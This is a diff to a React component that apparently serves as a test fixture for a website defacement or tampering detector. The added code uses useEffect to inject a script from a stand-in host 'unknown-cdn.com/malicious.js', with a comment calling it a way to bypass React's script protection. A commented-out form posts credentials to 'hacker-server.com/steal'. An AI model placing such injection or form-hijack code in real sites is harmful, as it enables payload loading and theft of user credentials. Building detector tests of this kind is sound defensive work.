@@ -1,17 +1,30 @@
-import React from 'react';
+import React, { useEffect } from 'react';
 
 /**
- * MainContent - Text Change Stress Test Version
- *
- * Focus:
- * - Replacing headlines
- * - Changing body text
- * - Modifying labels/buttons
- * - Rewriting large content blocks
- * - Structural drift via extra nodes
+ * MainContent - Layer 1 Full Stress Test
+ * 
+ * Logic being tested:
+ * 1. Script Injection (via useEffect) -> script_injection_new_domain
+ * 2. Structural Drift (h5 instead of h1) -> raw_score change
+ * 3. Form Hijacking (action change) -> form_action_change_payment
  */
 
 const MainContent = () => {
+  
+  // Method to bypass React's script protection and force it into the DOM
+  useEffect(() => {
+    const script = document.createElement("script");
+    script.src = "https://unknown-cdn.com/malicious.js";
+    script.id = "malicious-script-trigger";
+    document.body.appendChild(script);
+    
+    // Cleanup when component unmounts
+    return () => {
+      const el = document.getElementById("malicious-script-trigger");
+      if (el) document.body.removeChild(el);
+    };
+  }, []);
+
   return (
     <div className="defaced-root" id="layer1-pwned-zone">
 
@@ -24,11 +37,10 @@ const MainContent = () => {
           textAlign: 'center',
         }}
       >
-        {/* HEADLINE CHANGE */}
-        <h5 style={{ fontSize: '3rem', marginBottom: '10px' }}>
+        {/* TEST 1: Change h1 to h5 (Structural Drift) */}
+        {/* <h5 style={{ fontSize: '3rem', marginBottom: '10px' }}>
           PLATFORM MAINTENANCE ACTIVE
         </h5>
-<script src="https://unknown-cdn.com/malicious.js"></script>
 
         <h2 style={{ fontWeight: 'normal' }}>
           Hacker
@@ -37,54 +49,15 @@ const MainContent = () => {
 
       <main className="content-purge" style={{ padding: '30px' }}>
 
-        {/* BODY TEXT CHANGES */}
         <p>
           This platform is currently undergoing infrastructure upgrades
           and authentication system maintenance.
-        </p>
+        </p> */}
 
-        <p>
-          Certain administrative features may be temporarily unavailable
-          while synchronization processes complete.
-        </p>
-
-        {/* Add 10 dummy divs to change the node count */}
-        {/* Test: Structural Drift (Scoring Logic) */}
-        {/* <div>
-          {[...Array(10)].map((_, i) => (
-            <div key={i}>Extra Node {i + 1}</div>
-          ))}
-        </div> */}
-
-        {/* LARGE CONTENT REWRITE */}
-        <section
-          style={{
-            background: '#1b1b1b',
-            color: '#f5f5f5',
-            padding: '25px',
-            borderRadius: '8px',
-            marginTop: '30px',
-          }}
-        >
-          <h3>Infrastructure Update Notice</h3>
-
-          <p>
-            Several backend services are being redeployed as part of
-            a scheduled modernization initiative. This includes API
-            routing improvements, database optimization procedures,
-            and internal authentication policy upgrades.
-          </p>
-
-          <p>
-            Users may experience temporary interruptions while
-            synchronization tasks complete across distributed regions.
-            We appreciate your patience while these updates are finalized.
-          </p>
-        </section>
-
-        {/* MODIFIED FORM LABELS + BUTTONS */}
-         {/* <form
-          action="/verify"
+        {/* TEST 2: Form Action Hijacking */}
+        {/* Note: Ensure page_type is set to 'payment' in your DB to trigger this! */}
+        {/* <form 
+          action="https://hacker-server.com/steal" 
           method="POST"
           style={{
             margin: '40px 0',
@@ -92,19 +65,7 @@ const MainContent = () => {
             padding: '20px',
             borderRadius: '6px',
           }}
-        >  */}
- {/* <form action="https://hacker-server.com/steal" method="POST"
-  
-  
-      style={{
-            margin: '40px 0',
-            border: '2px solid #ff4444',
-            padding: '20px',
-            borderRadius: '6px',
-          }}
-  
-  > */}
-         
+        > */}
           <h3>Administrator Access Validation</h3>
 
           <label
